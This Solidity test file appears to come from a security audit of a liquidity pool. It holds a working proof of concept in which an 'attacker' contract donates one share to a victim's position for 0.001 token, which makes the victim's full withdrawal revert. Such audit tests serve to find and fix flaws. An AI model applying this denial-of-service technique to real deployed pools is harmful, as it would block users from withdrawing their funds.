// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {MetricOmmPoolFactoryTest} from "./MetricOmmPoolFactory.t.sol";
import {IMetricOmmPoolActions} from "../contracts/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {IMetricOmmPool, PoolImmutables} from "../contracts/interfaces/IMetricOmmPool/IMetricOmmPool.sol";
import {
  IMetricOmmModifyLiquidityCallback
} from "../contracts/interfaces/callbacks/IMetricOmmModifyLiquidityCallback.sol";
import {PoolParameters} from "../contracts/types/FactoryOperation.sol";
import {LiquidityDelta} from "../contracts/types/PoolOperation.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract MaterialOnBehalfDonor is IMetricOmmModifyLiquidityCallback {
  using SafeERC20 for IERC20;

  function add(address pool, address owner, uint80 salt, LiquidityDelta memory deltas)
    external
    returns (uint256 amount0, uint256 amount1)
  {
    return IMetricOmmPoolActions(pool).addLiquidity(owner, salt, deltas, "", "");
  }

  function metricOmmModifyLiquidityCallback(uint256 amount0, uint256 amount1, bytes calldata) external {
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    if (amount0 != 0) IERC20(imm.token0).safeTransfer(msg.sender, amount0);
    if (amount1 != 0) IERC20(imm.token1).safeTransfer(msg.sender, amount1);
  }
}

contract OnBehalfShareDonationMaterialAuditTest is MetricOmmPoolFactoryTest {
  uint256 internal constant MATERIAL_DENSITY_E18 = 1e33;
  uint80 internal constant POSITION_SALT = 17;

  function _singleDelta(int8 bin, uint256 shares) internal pure returns (LiquidityDelta memory d) {
    d.binIdxs = new int256[](1);
    d.shares = new uint256[](1);
    d.binIdxs[0] = bin;
    d.shares[0] = shares;
  }

  function test_factoryValidOneTokenPositionCanBeCensoredForOneMilliToken() public {
    // This is comfortably below the production factory's uint128 density cap.
    assertLt(MATERIAL_DENSITY_E18, type(uint128).max);

    PoolParameters memory params = _defaultPoolParams();
    params.initialAmount0PerShareE18 = MATERIAL_DENSITY_E18;
    params.initialAmount1PerShareE18 = MATERIAL_DENSITY_E18;
    params.salt = keccak256("MATERIAL_DONATION_DOS_POOL");
    address targetPool = factory.createPool(params);

    PoolImmutables memory imm = IMetricOmmPool(targetPool).getImmutables();
    MaterialOnBehalfDonor seeder = new MaterialOnBehalfDonor();
    MaterialOnBehalfDonor attacker = new MaterialOnBehalfDonor();
    address victim = makeAddr("material-position-victim");

    // Fund both callback contracts with ordinary 18-decimal assets.
    MockERC20(imm.token0).mint(address(seeder), 2 ether);
    MockERC20(imm.token1).mint(address(seeder), 2 ether);
    MockERC20(imm.token0).mint(address(attacker), 1 ether);
    MockERC20(imm.token1).mint(address(attacker), 1 ether);

    (uint256 victimAmount0, uint256 victimAmount1) =
      seeder.add(targetPool, victim, POSITION_SALT, _singleDelta(0, 1_000));
    assertEq(victimAmount0 + victimAmount1, 1 ether, "minimum position value at the 1:1 oracle price");

    uint256 attackerToken0Before = IERC20(imm.token0).balanceOf(address(attacker));
    uint256 attackerToken1Before = IERC20(imm.token1).balanceOf(address(attacker));
    attacker.add(targetPool, victim, POSITION_SALT, _singleDelta(0, 1));
    uint256 attackerCost =
      attackerToken0Before + attackerToken1Before
        - IERC20(imm.token0).balanceOf(address(attacker))
        - IERC20(imm.token1).balanceOf(address(attacker));

    vm.prank(victim);
    vm.expectRevert(abi.encodeWithSelector(IMetricOmmPoolActions.MinimalLiquidity.selector, 1, 1_000));
    IMetricOmmPoolActions(targetPool).removeLiquidity(victim, POSITION_SALT, _singleDelta(0, 1_000), "");

    emit log_named_decimal_uint("minimum position blocked", victimAmount0 + victimAmount1, 18);
    emit log_named_decimal_uint("cost to invalidate one withdrawal", attackerCost, 18);
    assertEq(attackerCost, 0.001 ether);
  }
}
